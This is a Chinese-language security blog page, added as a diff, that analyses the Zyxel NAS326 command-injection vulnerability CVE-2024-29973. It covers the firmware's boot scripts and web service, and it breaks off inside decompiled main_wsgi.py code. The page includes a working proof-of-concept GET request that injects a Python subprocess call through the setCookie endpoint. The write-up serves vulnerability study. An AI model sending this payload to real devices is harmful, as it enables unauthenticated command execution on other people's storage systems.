@@ -1,0 +1,749 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="GroundCtl2MajorTom">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="CVE-2024-29973合勤NAS命令执行分析 固件版本：NAS326_V5.21(AAZF.4)C0 下载链接：https:&#x2F;&#x2F;archive.org&#x2F;details&#x2F;nas-zyxel-nas-326  漏洞描述根据NVD的描述：V5.21(AAZF.17)C0 之前的 Zyxel NAS326 固件版本和 V5.21(ABAG.14)C0 之前的 NAS542 固件版本中“setCook">
+<meta property="og:type" content="article">
+<meta property="og:title" content="zyxel-NAS命令执行">
+<meta property="og:url" content="http://groundctl2majortom.github.io/2024/09/01/zyxel-NAS%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="GroundCtl2MajorTom">
+<meta property="og:description" content="CVE-2024-29973合勤NAS命令执行分析 固件版本：NAS326_V5.21(AAZF.4)C0 下载链接：https:&#x2F;&#x2F;archive.org&#x2F;details&#x2F;nas-zyxel-nas-326  漏洞描述根据NVD的描述：V5.21(AAZF.17)C0 之前的 Zyxel NAS326 固件版本和 V5.21(ABAG.14)C0 之前的 NAS542 固件版本中“setCook">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240912211001107.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240912211248623.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240912211302819.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240912211706457.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240913140330946.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240913140928345.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240913143000301.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240913150219048.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240918113537308.png">
+<meta property="article:published_time" content="2024-09-01T03:34:41.000Z">
+<meta property="article:modified_time" content="2024-09-18T03:36:01.633Z">
+<meta property="article:author" content="GroundCtl2MajorTom">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240912211001107.png">
+  
+  
+  
+  <title>zyxel-NAS命令执行 - GroundCtl2MajorTom</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"groundctl2majortom.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>GroundCtl2majorTom</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="zyxel-NAS命令执行"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-09-01 11:34" pubdate>
+          2024年9月1日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          24 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">zyxel-NAS命令执行</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>CVE-2024-29973合勤NAS命令执行分析</p>
+<p>固件版本：NAS326_V5.21(AAZF.4)C0</p>
+<p>下载链接：<a target="_blank" rel="noopener" href="https://archive.org/details/nas-zyxel-nas-326">https://archive.org/details/nas-zyxel-nas-326</a></p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240912211001107.png" srcset="/img/loading.gif" lazyload alt="image-20240912211001107"></p>
+<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h3><p>根据NVD的描述：V5.21(AAZF.17)C0 之前的 Zyxel NAS326 固件版本和 V5.21(ABAG.14)C0 之前的 NAS542 固件版本中“setCookie”参数中的命令注入漏洞可能允许未经身份验证的攻击攻击者通过发送精心设计的 HTTP POST 请求来执行某些操作系统 (OS) 命令。</p>
+<p><strong>产品介绍</strong></p>
+<p>Zyxel-NAS 是指由 Zyxel Communications Corporation（合勤科技股份有限公司）开发和生产的网络附加存储（Network Attached Storage，简称 NAS）设备。NAS 是一种专门用于存储和共享文件的设备，它通过网络连接到计算机、服务器或其他设备，提供集中式的文件存储和访问功能。</p>
+<h3 id="固件分析"><a href="#固件分析" class="headerlink" title="固件分析"></a><strong>固件分析</strong></h3><p>固件下载好以后解压，得到两个文件系统</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240912211248623.png" srcset="/img/loading.gif" lazyload alt="image-20240912211248623"></p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240912211302819.png" srcset="/img/loading.gif" lazyload alt="image-20240912211302819"></p>
+<h4 id="启动项分析"><a href="#启动项分析" class="headerlink" title="启动项分析"></a>启动项分析</h4><h5 id="分析cpio-root中的rcS文件"><a href="#分析cpio-root中的rcS文件" class="headerlink" title="分析cpio-root中的rcS文件"></a>分析cpio-root中的rcS文件</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs shell">.........<br>create_ubi_dev_node()<br>&#123;<br>.......<br>&#125;<br><br>prepare_config_partition()<br>&#123;<br>........<br>&#125;<br><br>check_and_run_usbkey()<br>&#123;<br>.......<br>&#125;<br><br>no_image_handler()<br>&#123;<br>.......<br>&#125;<br>checksum_img()<br>&#123;<br>.......<br>&#125;<br>flash_fail_handler()<br>&#123;<br>.......<br>&#125;<br>rescan_lost_scsi_device()<br>&#123;<br>......<br>&#125;<br><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;ECHO&#125; -e <span class="hljs-string">&quot;\033[031m*** Stage 2: Prepare the root file system ***\033[0m&quot;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Mount NAND <span class="hljs-keyword">for</span> System Disk image.</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;ECHO&#125; -e <span class="hljs-string">&quot;\033[033mMount system partition...\033[0m&quot;</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;MKDIR&#125; -p <span class="hljs-variable">$&#123;NAND_PATH&#125;</span></span><br>.......<br><span class="hljs-meta prompt_"># </span><span class="language-bash">check key here - the earliest location to <span class="hljs-built_in">let</span> pt/pk key work without errors</span><br>check_and_run_usbkey<br>......<br>ls -l /dev/ubi*<br>......<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#### HTP</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">execute HTP forever</span><br>....<br><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;IMG_PATH&#125;/etc/init.d/rcS2</span><br></code></pre></td></tr></table></figure>
+
+<p>rcS主要负责以下几个方面：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">准备根文件系统： 脚本首先会根据系统配置信息，确定系统镜像文件所在的 MTD 分区，并挂载该分区到 /mnt/sysinit 目录。<br>启动 FTP 服务，允许用户通过 FTP 协议上传系统镜像文件。<br>扫描 USB 设备，尝试找到包含系统镜像文件的 USB 存储设备。<br>检查系统镜像文件完整性： 脚本会使用 <span class="hljs-built_in">md5sum</span> 命令计算系统镜像文件的 MD5 校验和，并与系统配置信息中的校验和进行比较，以验证镜像文件是否完整。<br>挂载系统镜像文件： 脚本会将系统镜像文件挂载到 /mnt/sysinit 目录，并复制一些必要的系统文件到 /bin 和 /sbin 目录。<br>挂载配置分区： 脚本会挂载配置分区到 /etc/zyxel 目录，并检查配置分区是否存在。<br>恢复配置信息： 脚本会检查配置分区中是否存在 zyconf.tgz 文件，如果存在，则解压缩该文件，恢复系统配置信息。<br>设置文件系统权限： 脚本会设置一些目录的权限，例如 /etc/zyxel 目录的权限设置为 777。<br>最后执行 rcS2 脚本： 脚本最后会执行 /mnt/sysinit/etc/init.d/rcS2 脚本，该脚本负责启动系统服务，包括 Web 服务。<br></code></pre></td></tr></table></figure>
+
+<p>因此设备启动时，应该是先执行cpio-root文件系统中的rcS，把ext-root文件系统挂载，最后执行ext-root中的rcS2文件</p>
+<h5 id="分析rcS2"><a href="#分析rcS2" class="headerlink" title="分析rcS2"></a>分析rcS2</h5><p> rcS2 启动脚本，负责启动系统中的大部分服务，其中也包括 Web 服务。启动顺序如下</p>
+<ol>
+<li><p><strong>准备环境：</strong> 脚本首先会设置一些环境变量，包括系统路径和模型 ID 等。</p>
+</li>
+<li><p><strong>启动 WSGI 服务器：</strong> 脚本使用 <code>main_wsgi.sh</code> 脚本启动 WSGI 服务器</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;ECHO&#125; <span class="hljs-string">&quot;Starting WSGI server...&quot;</span></span><br>/etc/init.d/main_wsgi.sh start<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>main_wsgi.sh</code> 脚本是用来启动 WSGI 服务器的，它会调用 <code>python</code> 命令执行 <code>main_wsgi.pyc</code> 文件，该文件包含了 WSGI 服务器的逻辑。</li>
+</ul>
+</li>
+<li><p><strong>加载 PyConf 配置文件：</strong> 脚本会加载 <code>py_conf</code> 配置文件，并将其复制到 <code>/var/web_framework</code> 目录。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## Load PyConf for User###</span></span><br>if [ ! -f /etc/zyxel/py_conf ]; then<br>    cp -a /usr/local/apache/web_framework/data/config/py_conf_default /etc/zyxel/py_conf<br>fi<br>chmod 0777 /etc/zyxel/py_conf<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">copy py_conf from flash to ram <span class="hljs-keyword">for</span> reducing flash write <span class="hljs-built_in">times</span>.</span><br>cp -a /etc/zyxel/py_conf /var/web_framework/<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>py_conf</code> 文件包含了 Web 应用程序的配置信息，例如数据库连接信息、用户认证信息等等。</li>
+</ul>
+</li>
+<li><p><strong>执行启动脚本：</strong> 脚本会执行 <code>bootsup.pyc</code> 脚本，该脚本负责加载配置信息并启动 Web 应用程序。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">start to check add new configurations of py_conf</span><br>/usr/bin/python /usr/local/apache/web_framework/lib/bootsup.pyc<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>启动 Zylog 服务：</strong> 脚本使用 <code>zylog_no_logging</code> 命令启动 Zylog 服务，该服务负责记录系统日志。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;ECHO&#125; <span class="hljs-string">&quot;No more ZySH daemon and client...&quot;</span></span><br><br>/usr/sbin/zylog_no_logging syslog 1<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>设置 URL 前缀：</strong> 脚本使用 <code>chUrlPrefix.sh</code> 脚本设置 Web 服务的 URL 前缀。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/usr/sbin/chUrlPrefix.sh setprefix<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>启动 Zylog 模型：</strong> 脚本使用 <code>python</code> 命令执行 <code>zylog_main_model.pyc</code> 文件，该文件包含了 Zylog 模型的逻辑。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/usr/bin/python /usr/local/apache/web_framework/models/zylog_main_model.pyc<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>启动 UPnP 数据库检查：</strong> 脚本会检查 UPnP 数据库文件是否存在，如果不存在，则从 <code>/ram_bin/usr/etc</code> 目录复制默认的数据库文件。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">UPnP database-checking(Must before zypkg_controller, because package will using upnpdb)</span><br>if [ ! -e /etc/zyxel/upnp.db ]; then<br>    cp -a /ram_bin/usr/etc/upnp.db /etc/zyxel/upnp.db<br>else<br>    UPDATE_DB_FLAG=`sqlite3 /etc/zyxel/upnp.db &quot;.tables revision&quot;`<br>    # ... (代码省略)<br>fi<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>启动 Zypkg 控制器：</strong> 脚本使用 <code>zypkg_controller.sh</code> 脚本启动 Zypkg 控制器，该控制器负责管理系统软件包。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">start package httpd early because of the fixed ports</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">prepare zypkg</span><br>/etc/init.d/zypkg_controller.sh prepare_env<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">start-up zypkgs</span><br>if [ &quot;$?&quot; = &quot;0&quot; ]; then<br>    /etc/init.d/zypkg_controller.sh start<br>fi<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>启动其他服务：</strong> 脚本还会启动其他服务，例如 SMB 服务、NMB 服务、AFP 服务、Cron 服务等等。</p>
+</li>
+</ol>
+<h5 id="WSGI服务"><a href="#WSGI服务" class="headerlink" title="WSGI服务"></a><strong>WSGI服务</strong></h5><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">WSGI (Web Server Gateway <span class="hljs-keyword">Interface</span>) 是一种Python 规范，定义了 Web 服务器和 Web 应用程序之间通信的标准接口。它允许 Web 服务器将 HTTP 请求传递给 Web 应用程序，并接收应用程序生成的 HTTP 响应。<br></code></pre></td></tr></table></figure>
+
+<h5 id="CherryPy"><a href="#CherryPy" class="headerlink" title="CherryPy"></a><strong>CherryPy</strong></h5><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">CherryPy</span> 是一个 Python Web 框架，它实现了 WSGI 规范。<br></code></pre></td></tr></table></figure>
+
+<h5 id="CherryPy-如何与-WSGI-协作："><a href="#CherryPy-如何与-WSGI-协作：" class="headerlink" title="CherryPy 如何与 WSGI 协作："></a><strong>CherryPy 如何与 WSGI 协作：</strong></h5><ul>
+<li>CherryPy 提供了一个 WSGI 应用程序对象，它接收 HTTP 请求并返回 HTTP 响应。</li>
+<li>CherryPy 还提供了一个内置的 WSGI 服务器，可以用来运行 CherryPy 应用程序。</li>
+</ul>
+<p>根据cve的描述，漏洞点在ext-root文件系统中main_wsgi.pyc，ext-root文件系统大小为125.2MB</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240912211706457.png" srcset="/img/loading.gif" lazyload alt="image-20240912211706457"></p>
+<p>main_wsgi.pyc文件需要用到uncompyle6来反编译，并且文件系统里面也有很多pyc文件</p>
+<p>使用了如下命令，将该目录下所有pyc文件反编译并将反编译后得到的py放回原目录下方便查看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find . -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&#x27;*.pyc&#x27;</span> | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> pyc_file; <span class="hljs-keyword">do</span> uncompyle6 -o <span class="hljs-string">&quot;<span class="hljs-subst">$(dirname <span class="hljs-string">&quot;<span class="hljs-variable">$pyc_file</span>&quot;</span>)</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$pyc_file</span>&quot;</span>; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240913140330946.png" srcset="/img/loading.gif" lazyload alt="image-20240913140330946"></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>poc</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/cmd,/simZysh/register_main/setCookie?c0=storage_ext_cgi+CGIGetExtStoInfo+None)+and+False+or+__import__(&quot;subprocess&quot;).check_output(&quot;ps&quot;,+shell=True)%23</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-gml">Host: <span class="hljs-variable language_">x</span>.<span class="hljs-variable language_">x</span>.<span class="hljs-variable language_">x</span>.<span class="hljs-variable language_">x</span></span><br><span class="language-gml"></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240913140928345.png" srcset="/img/loading.gif" lazyload alt="image-20240913140928345"></p>
+<p>查看main_wsgi.py文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python">..........<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tjp6jp6y4</span>(<span class="hljs-params">self, *url_args, **request_args</span>):<br>        <span class="hljs-keyword">if</span> url_args[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;register_main&#x27;</span> <span class="hljs-keyword">and</span> url_args[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;setCookie&#x27;</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> request_args.has_key(<span class="hljs-string">&#x27;location&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> request_args.has_key(<span class="hljs-string">&#x27;cookie&#x27;</span>):<br>                <span class="hljs-keyword">return</span><br>            cherrypy.response.status = <span class="hljs-number">302</span><br>            cherrypy.response.headers[<span class="hljs-string">&#x27;location&#x27;</span>] = request_args[<span class="hljs-string">&#x27;location&#x27;</span>]<br>            cherrypy.response.headers[<span class="hljs-string">&#x27;Set-Cookie&#x27;</span>] = request_args[<span class="hljs-string">&#x27;cookie&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            url = tools_cherrypy.SOCKET_URL_PREFIX + <span class="hljs-string">&#x27;/tjp6jp6y4_to_wsgi_server/%s/%s&#x27;</span> % (url_args[<span class="hljs-number">0</span>], url_args[<span class="hljs-number">1</span>])<br>            response = tools_cherrypy.socket_request(url, data=request_args, cookies=<span class="hljs-variable language_">self</span>.set_cookies())<br>            <span class="hljs-keyword">if</span> response == tools_cherrypy.INT_SERV_ERROR:<br>                <span class="hljs-keyword">return</span> response<br>            <span class="hljs-keyword">return</span> response.content<br>        <span class="hljs-keyword">return</span><br><br>    tjp6jp6y4.exposed = <span class="hljs-literal">True</span><br>    tjp6jp6y4._cp_config = &#123;<span class="hljs-string">&#x27;tools.jsonify.on&#x27;</span>: <span class="hljs-literal">False</span>&#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">simZysh</span>(<span class="hljs-params">self, *url_args, **request_args</span>):<br>        <span 